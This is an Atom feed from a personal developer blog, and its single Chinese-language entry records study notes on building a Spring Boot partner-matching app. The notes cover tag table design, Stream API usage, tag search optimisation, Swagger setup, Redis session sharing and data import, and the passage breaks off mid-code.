<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>幻境</title>
  
  <subtitle>yub_s blog</subtitle>
  <link href="https://yubut.github.io/atom.xml" rel="self"/>
  
  <link href="https://yubut.github.io/"/>
  <updated>2025-02-07T06:25:28.805Z</updated>
  <id>https://yubut.github.io/</id>
  
  <author>
    <name>yub</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>FightPart项目疑问记录</title>
    <link href="https://yubut.github.io/2025/02/07/FightPart%E9%A1%B9%E7%9B%AE%E7%96%91%E9%97%AE%E8%AE%B0%E5%BD%95/"/>
    <id>https://yubut.github.io/2025/02/07/FightPart%E9%A1%B9%E7%9B%AE%E7%96%91%E9%97%AE%E8%AE%B0%E5%BD%95/</id>
    <published>2025-02-07T06:23:39.000Z</published>
    <updated>2025-02-07T06:25:28.805Z</updated>
    
    <content type="html"><![CDATA[<h4 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h4><ol><li>用户自定义添加标签，标签的分类（类型，怎么分类）比如Java&#x2F;C++&#x2F;网络安全，工作&#x2F;大学</li><li>主动搜索，允许用户根据标签去搜索其他用户</li><li>组队<ul><li>创建队伍</li><li>加入队伍</li><li>根据标签查询队伍</li><li>邀请其他人</li><li>退出队伍</li></ul></li><li>允许用户修改标签</li><li>推荐<ul><li>相似度计算算法+本地分布式计算</li></ul></li></ol><h4 id="后端技术栈"><a href="#后端技术栈" class="headerlink" title="后端技术栈"></a>后端技术栈</h4><ol><li>Java+SpringBoot框架</li><li>SpringMVC+MyBatis+MyBatisPlus（提高开发效率）</li><li>MySQL数据库</li><li>Redis缓存</li><li>Swagger+Knife4j接口文档</li></ol><h4 id="数据库表设计"><a href="#数据库表设计" class="headerlink" title="数据库表设计"></a>数据库表设计</h4><p>标签的分类（有哪些、怎么分）<br>不建议使用boolean定义，不灵活</p><h5 id="新增标签表（分类表）"><a href="#新增标签表（分类表）" class="headerlink" title="新增标签表（分类表）"></a>新增标签表（分类表）</h5><p>建议用标签，不使用分类，更灵活.<br>性别：男、女<br>学习方向：Java、C++、Go、前端、网络安全<br>目标：考研、考公、春招、社招、竞赛、转行、跳槽<br>段位：<br>身份：<br>状态：<br>着重自定义|</p><h5 id="表设计"><a href="#表设计" class="headerlink" title="表设计"></a>表设计</h5><ul><li>id int 主键、</li><li>标签名 varchar 非空(必须唯一，唯一索引)</li><li>上传标签的用户 userld int(如果要根据 userld 查已上传标签的话，最好加上,普通索引)</li><li>父标签 id ，parentld,int(分类)</li><li>是否为父标签 isParent, tinyint(0 不是父标签、1-父标签)</li><li>创建时间 createTime, datetime</li><li>更新时间 updateTime,datetime</li><li>是否删除 isDelete， tinyint(0、1)</li></ul><p><strong>索引最好加在有很多个值的列</strong></p><h5 id="验证设计"><a href="#验证设计" class="headerlink" title="验证设计"></a>验证设计</h5><ul><li>通过父标签id分组实现查询所有标签</li><li>根据父标签id查询子标签</li></ul><h5 id="修改用户表"><a href="#修改用户表" class="headerlink" title="修改用户表"></a>修改用户表</h5><p>hh又是经典大小写踩坑环节，记得选择实际的列.（className也注意一下）</p><p><img src="G:/blog/source/imgs/2025-01/image-20250121162505817.png" alt="image-20250121162505817"></p><p><img src="G:/blog/source/imgs/2025-01/image-20250121162434713.png" alt="image-20250121162434713"></p><p><strong>lambda表达式进化</strong><br>初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">userList.forEach(user -&gt; &#123;</span><br><span class="line">    getSafetyUser(user);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>2.0<br><img src="G:/blog/source/imgs/2025-01/image-20250121224426591.png" alt="image-20250121224426591"></p><p>Java 8 的函数式编程特性，将当前对象的 <code>getSafetyUser</code> 方法作为参数传递给 <code>forEach</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userList.forEach(<span class="built_in">this</span>::getSafetyUser);</span><br></pre></td></tr></table></figure><p><code>map</code> 是一种<strong>中间操作</strong>，用于将流中的每个元素应用某个函数并返回一个新的流.</p><p> <strong>Java 8 Stream API</strong> </p><table><thead><tr><th><strong>操作类型</strong></th><th><strong>方法</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>中间操作</td><td><code>filter(Predicate)</code></td><td>筛选符合条件的元素，返回一个新的流。</td></tr><tr><td></td><td><code>map(Function)</code></td><td>将每个元素转换为另一种形式，返回新的流。</td></tr><tr><td></td><td><code>flatMap(Function)</code></td><td>将每个元素转换为一个流，然后将多个流合并为一个流。</td></tr><tr><td></td><td><code>sorted()</code></td><td>根据自然顺序或提供的比较器对元素进行排序，返回排序后的流。</td></tr><tr><td></td><td><code>distinct()</code></td><td>去除流中的重复元素，返回一个只含唯一元素的流。</td></tr><tr><td></td><td><code>limit(long n)</code></td><td>截取前 <code>n</code> 个元素，返回一个新的流。</td></tr><tr><td></td><td><code>skip(long n)</code></td><td>跳过前 <code>n</code> 个元素，返回剩下的元素组成的新流。</td></tr><tr><td>终端操作</td><td><code>collect(Collector)</code></td><td>将流中的元素收集到一个集合中，如 <code>List</code>、<code>Set</code>。</td></tr><tr><td></td><td><code>forEach(Consumer)</code></td><td>对每个元素执行给定的动作，没有返回值。</td></tr><tr><td></td><td><code>reduce(BinaryOperator)</code></td><td>将流中的元素组合成一个值，常用于求和、乘积等聚合操作。</td></tr><tr><td></td><td><code>count()</code></td><td>返回流中元素的数量。</td></tr><tr><td></td><td><code>findFirst()</code></td><td>返回流中的第一个元素（如果存在则返回一个 <code>Optional</code>）。</td></tr><tr><td></td><td><code>findAny()</code></td><td>返回流中的任意一个元素（适用于并行流）。</td></tr><tr><td></td><td><code>allMatch(Predicate)</code></td><td>检查是否所有元素都匹配给定的条件，返回布尔值。</td></tr><tr><td></td><td><code>anyMatch(Predicate)</code></td><td>检查是否至少有一个元素匹配给定的条件，返回布尔值。</td></tr><tr><td></td><td><code>noneMatch(Predicate)</code></td><td>检查是否没有任何元素匹配给定的条件，返回布尔值。</td></tr></tbody></table><p>shift + alt + -&#x2F;+ 折叠&#x2F;展开所有方法</p><p><strong>Mybatis-Plus开启SQL日志打印</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br></pre></td></tr></table></figure><p>使用stream API filter过滤不满足条件的用户.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userList.stream().filter(user -&gt; &#123;&#125;) ;</span><br></pre></td></tr></table></figure><h4 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h4><p>根据实际业务场景做取舍.【不断测试，注意考虑连接数据库耗时】</p><h5 id="搜索标签"><a href="#搜索标签" class="headerlink" title="搜索标签"></a>搜索标签</h5><ol><li>允许用户传入多个标签，多个标签同时存在才能搜索的出.and like’%Java%’ and like ‘%Python%’</li><li>允许用户传入多个标签，有任何一个标签存在就能搜索出来.or like’%Java%’ or like ‘%Python%’</li></ol><ul><li>SQL查询（简单易实现，可以拆分查询）</li><li>内存查询（灵活，可以通过并发进一步优化）</li><li>SQL和内存计算相结合，比如先用SQL过滤掉部分tag</li></ul><p>如果参数可以分析，根据用户的参数去选择查询方式，比如标签数.<br>如果参数不可以分析，并且数据库连接足够、内存空间足够，可以同时并发查询，谁先返回用谁.<br><strong>通过实际测试决定.</strong></p><p><strong>表示过时的方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Deprecated</span></span><br></pre></td></tr></table></figure><p>SQL查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Deprecated</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;User&gt; <span class="title function_">searchUsersByTagsSQL</span><span class="params">(List&lt;String&gt; tagNameList)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (CollectionUtils.isEmpty(tagNameList)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BusinessException</span>(ErrorCode.PARAMS_ERROR);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        long startTime = System.currentTimeMillis();</span></span><br><span class="line">        QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//        // 拼接and 查询</span></span><br><span class="line"><span class="comment">//        // like &#x27;%Java%&#x27; and line &#x27;%Python%&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> (String tagName : tagNameList) &#123;</span><br><span class="line">            queryWrapper = queryWrapper.like(<span class="string">&quot;tags&quot;</span>, tagName);</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;User&gt; userList = userMapper.selectList(queryWrapper);</span><br><span class="line">        <span class="keyword">return</span> userList.stream().map(<span class="built_in">this</span>::getSafetyUser).collect(Collectors.toList());</span><br><span class="line"><span class="comment">//        log.info(&quot;sql query time = &quot; + (System.currentTimeMillis() - startTi</span></span><br></pre></td></tr></table></figure><h5 id="并发处理parallelStream"><a href="#并发处理parallelStream" class="headerlink" title="并发处理parallelStream()"></a>并发处理parallelStream()</h5><p>原查询（先数据库过滤再内存过滤）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">searchUsersByTags</span><span class="params">(List&lt;String&gt; tagNameList)</span> &#123;</span><br><span class="line">    <span class="comment">//1. 查询所有用户</span></span><br><span class="line">    <span class="type">QueryWrapper</span> <span class="variable">queryWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">    List&lt;User&gt; userList = userMapper.selectList(queryWrapper);</span><br><span class="line">    <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">    <span class="comment">//2. 在内存中查询是否包含符合要求的标签</span></span><br><span class="line">    <span class="keyword">return</span> userList.stream().filter(user -&gt; &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">tagStr</span> <span class="operator">=</span> user.getTags();</span><br><span class="line">        <span class="comment">//重要的校验</span></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isBlank(tagStr)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;String&gt; tempTagList = gson.fromJson(tagStr, <span class="keyword">new</span> <span class="title class_">TypeToken</span>&lt;Set&lt;String&gt;&gt;() &#123;</span><br><span class="line">        &#125;.getType());</span><br><span class="line">        <span class="keyword">for</span> (String tagName : tagNameList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!tempTagList.contains(tagName)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;).map(<span class="built_in">this</span>::getSafetyUser).collect(Collectors.toList());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并发处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">searchUsersByTags</span><span class="params">(List&lt;String&gt; tagNameList)</span> &#123;</span><br><span class="line">    <span class="comment">//1. 查询所有用户</span></span><br><span class="line">    <span class="type">QueryWrapper</span> <span class="variable">queryWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">    List&lt;User&gt; userList = userMapper.selectList(queryWrapper);</span><br><span class="line">    <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">    <span class="comment">//2. 在内存中查询是否包含符合要求的标签</span></span><br><span class="line">    <span class="keyword">return</span> userList.parallelStream().filter(user -&gt; &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">tagStr</span> <span class="operator">=</span> user.getTags();</span><br><span class="line">        <span class="comment">//重要的校验</span></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isBlank(tagStr)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;String&gt; tempTagList = gson.fromJson(tagStr, <span class="keyword">new</span> <span class="title class_">TypeToken</span>&lt;Set&lt;String&gt;&gt;() &#123;</span><br><span class="line">        &#125;.getType());</span><br><span class="line">        <span class="keyword">for</span> (String tagName : tagNameList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!tempTagList.contains(tagName)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;).map(<span class="built_in">this</span>::getSafetyUser).collect(Collectors.toList());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于parallelStream()使用的是一个公共线程池，如果是一个特别复杂的并发查询，此时一个线程池中可能会全部是parallelStream()执行的相应查询操作，线程池无法将其他任务进行分配，导致性能降低.</p><p><img src="G:/blog/source/imgs/2025-01/image-20250122233025028.png" alt="image-20250122233025028"></p><p><img src="G:/blog/source/imgs/2025-01/image-20250122233035549.png" alt="image-20250122233035549"></p><p>TODO 补充parallel陷阱.</p><p><code>Optional.ofNullable().orElse()</code>,判断一个可能为空的值，如果为空返回对应的值，不为空返回orElse中的值.<br><img src="G:/blog/source/imgs/2025-01/image-20250122234851260.png" alt="image-20250122234851260"></p><h4 id="后端整合Swagger-Knife4j接口文档"><a href="#后端整合Swagger-Knife4j接口文档" class="headerlink" title="后端整合Swagger + Knife4j接口文档"></a>后端整合Swagger + Knife4j接口文档</h4><h5 id="什么是接口文档"><a href="#什么是接口文档" class="headerlink" title="什么是接口文档"></a>什么是接口文档</h5><p>写接口的文档，每条接口包括：</p><ul><li>请求参数</li><li>相应参数<ul><li>错误码</li></ul></li><li>接口地址</li><li>接口名称</li><li>请求类型</li><li>请求格式</li><li>备注</li></ul><p>一般由后端&#x2F;负责人提供，前端和后端使用.</p><h5 id="为什么需要接口文档？"><a href="#为什么需要接口文档？" class="headerlink" title="为什么需要接口文档？"></a>为什么需要接口文档？</h5><ul><li>书面内容（归档&#x2F;背书），便于参考和查阅以及维护和沉淀,</li><li>接口文档便于前后端做开发对接，前后端联调的介质.</li><li>好的接口文档支持在线调试、在线测试，作为工具提高我们的开发效率.</li></ul><h5 id="怎么做接口文档？"><a href="#怎么做接口文档？" class="headerlink" title="怎么做接口文档？"></a>怎么做接口文档？</h5><ul><li>手写（比如腾讯文档、Markdown笔记）</li><li>自动化接口文档生成，自动根据项目代码生成完整的文档或在线调试的网页.Swagger，Postman（侧重接口管理）</li></ul><h5 id="接口文档有哪些技巧"><a href="#接口文档有哪些技巧" class="headerlink" title="接口文档有哪些技巧"></a>接口文档有哪些技巧</h5><p><strong>swagger原理</strong></p><ol><li>引入依赖（Swagger&#x2F;Knife4j）</li><li>自定义Swagger配置类</li><li>定义需要生成接口文档的代码位置（Controller）</li><li>注意！！线上环境不要把接口暴露出去，可以通过SwaggerConfig配置文件开头加上<code>@Profile(&#123;&quot;dev&quot;,&quot;test&quot;&#125;)</code>让定义的Bean在特定的环境生效【限定配置仅在部分环境开启】</li><li>启动即可</li><li>可以通过在Conroller方法上添加@Api、@ApilmplicitParam(name &#x3D;”name”,value&#x3D;”姓名”,required&#x3D;true)、@ApiOperation(value&#x3D;”向客人问好”)等注解来自定义生成的接口描述信息</li></ol><p>Swagger和 SpirngBoot版本 &gt;&#x3D;2.6，不兼容问题.需配置默认的路径匹配策略（同步配置Knif4j ，修改注解）<code>@EnableSwagger2WebMvc</code> +<code>@Bean(value = &quot;defaultApi2&quot;)</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.xiaoymin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>knife4j-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="G:/blog/source/imgs/2025-01/image-20250123162838032.png" alt="image-20250123162838032"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改swagger的路径匹配配置，使其兼容新版的SpringBoot</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">mvc:</span></span><br><span class="line">    <span class="attr">pathmatch:</span></span><br><span class="line">      <span class="attr">matching-strategy:</span> <span class="string">ANT_PATH_MATCHER</span></span><br></pre></td></tr></table></figure><p>之后访问<a href="http://ip:port/doc.html，就可以看到对应的管理页面">http://ip:port/doc.html，就可以看到对应的管理页面</a>.<br><img src="G:/blog/source/imgs/2025-01/image-20250124003710541.png" alt="image-20250124003710541"></p><h4 id="抓取网页信息"><a href="#抓取网页信息" class="headerlink" title="抓取网页信息"></a>抓取网页信息</h4><ol><li><p>分析原网站是根据哪个接口获取数据（F12打开控制台，网络中复制CURL）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;https://api.zsxq.com/v2/hashtags/48844541281228/topics?count=20&quot;</span> ^</span><br><span class="line">  -H <span class="string">&quot;authority: api.zsxq.com&quot;</span> ^</span><br><span class="line">  -H <span class="string">&quot;accept: application/json, text/plain, */*&quot;</span> ^</span><br><span class="line">  -H <span class="string">&quot;accept-language: zh-CN,zh;q=0.9&quot;</span> ^</span><br><span class="line">  -H <span class="string">&quot;cache-control: no-cache&quot;</span> ^</span><br><span class="line">  -H <span class="string">&quot;origin: https://wx.zsxq.com&quot;</span> ^</span><br><span class="line">  -H <span class="string">&quot;pragma: no-cache&quot;</span> ^</span><br><span class="line">  -H <span class="string">&quot;referer: https://wx.zsxq.com/&quot;</span> ^</span><br><span class="line">  --compressed</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>cookie使用自己的</p><p><strong>2.用程序调用接口</strong><br>3.处理（清洗）数据，之后写入数据库</p></li></ol><p><strong>EasyExcel</strong></p><p><strong>两种读对象的方式</strong></p><ol><li>确定表头：建立对象，和表头形成映射关系</li><li>不确定表头：每一行数据映射为Map&lt;Stirng, Object&gt;</li></ol><p><strong>两种读取模式</strong></p><ol><li>监听器：先创建监听器、在读取文件时绑定监听器.单独抽离处理逻辑，代码清晰易维护，一条条处理，适用于数量大的场景.</li><li>同步读：无序创建监听器，一次性获取完整数据.方便简单，但数据量大时会有等待异常，也可能内存溢出,</li></ol><h5 id="使用Terminal运行SpringBoot项目"><a href="#使用Terminal运行SpringBoot项目" class="headerlink" title="使用Terminal运行SpringBoot项目"></a>使用Terminal运行SpringBoot项目</h5><ol><li>先利用Maven自带打包工具打包好jar包</li><li>打开Terminal</li></ol><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\user-center-<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>-SNAPSHOT.jar --server.port=<span class="number">8080</span></span><br></pre></td></tr></table></figure><p>哦豁，出现”0.0.1-SNAPSHOT.jar中没有主清单属性”<br>解决：在pom文件的maven插件中增加repackage</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                       <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><p>前端请求的时候带上一个JSESSIONID，和每个服务器的后台建一个唯一的会话（一一对应），服务器能根据JSESSIONID中定位到请求到对象，进而从请求对象的session中找到请求对象的信息.</p><p><img src="G:/blog/source/imgs/2025-01/image-20250124004306747.png" alt="image-20250124004306747"></p><h5 id="Session共享"><a href="#Session共享" class="headerlink" title="Session共享"></a>Session共享</h5><p>种session的时候注意范围.<br><img src="G:/blog/source/imgs/2025-01/image-20250124103502790.png" alt="image-20250124103502790"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">servlet:</span></span><br><span class="line">  <span class="attr">session:</span></span><br><span class="line">    <span class="attr">cookie:</span></span><br><span class="line">      <span class="attr">domain:</span></span><br></pre></td></tr></table></figure><p>比如两个域名：aaa.yub.com  bbb.yub.com<br>如果要共享cookie，可以种一个更高层的公共域名，比如yub.com</p><h5 id="为什么服务器A登录后，请求发送到服务区B，不认识该用户？"><a href="#为什么服务器A登录后，请求发送到服务区B，不认识该用户？" class="headerlink" title="为什么服务器A登录后，请求发送到服务区B，不认识该用户？"></a>为什么服务器A登录后，请求发送到服务区B，不认识该用户？</h5><p>用户在A登录，所以session（用户登录信息）存在了A上.<br>结果请求B，B没有用户信息，无法登录.</p><p><img src="G:/blog/source/imgs/2025-01/image-20250124104319917.png" alt="image-20250124104319917"></p><p><img src="G:/blog/source/imgs/2025-01/image-20250124104405411.png" alt="image-20250124104405411"></p><p><strong>如何共享内存？</strong></p><ol><li>Redis（基于内存的K &#x2F; V数据库）此处选择Redis。用户信息&#x2F;是否登录的判断及其<strong>频繁</strong>，Redis基于内存，读写性能很高，简单的数据 qps 5W -10W.</li><li>MySQL</li><li>文件服务器ceph</li></ol><h5 id="Session共享实现"><a href="#Session共享实现" class="headerlink" title="Session共享实现"></a>Session共享实现</h5><ol><li><p>github下载Redis</p></li><li><p>Maven仓库中找到喝spring-starter版本一致的redis依赖版本</p></li><li><p>Redis管理工具  QuickRedis <a href="https://quick123.net/">QuickOfficial - QuickRedis</a></p></li><li><p>引入Redis，操作Redis</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-data-redis --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>5.引入spring-session和Redis的整合，使得session自动存储到redis中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework.session/spring-session-data-redis --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.session<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-session-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>6.修改spring-session存储配置，<code>spinrg-session.store-type</code>,默认是null表示存储在单台服务器.【可以修改为redis，表示默认存储在redis中】</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">store-type:</span> <span class="string">redis</span></span><br><span class="line"><span class="comment">#表示从redis 读写session</span></span><br></pre></td></tr></table></figure><p><strong>记得测试时，使用不同的端口</strong>(debug+.\jar),在观察redis确定验证是否成功.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\user-center-<span class="number">0.0</span><span class="number">.1</span>-SNAPSHOT.jar --server.port=<span class="number">8081</span></span><br></pre></td></tr></table></figure><h5 id="主页开发"><a href="#主页开发" class="headerlink" title="主页开发"></a>主页开发</h5><p>最简单：直接list列表<br>模拟1000w个用户，再去查询</p><h6 id="批量导入数据"><a href="#批量导入数据" class="headerlink" title="批量导入数据"></a>批量导入数据</h6><ol><li>用可视化界面：适合一次性导入、数据量可控</li><li>写程序：for循环，建议分批，不要一把梭哈（可以使用接口来控制）</li><li>执行SQL语句，适用于小数据量（方法和以下操作相同，选择SQL Inserts）</li></ol><p><strong>保证可控性、幂等【注意线上环境和测试库有区别】</strong></p><p>导出csv文件</p><p><img src="G:/blog/source/imgs/2025-01/image-20250125130414250.png" alt="image-20250125130414250"></p><h5 id="编写一次性任务"><a href="#编写一次性任务" class="headerlink" title="编写一次性任务"></a>编写一次性任务</h5><p>定时任务，spring提供的StopWatch类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span 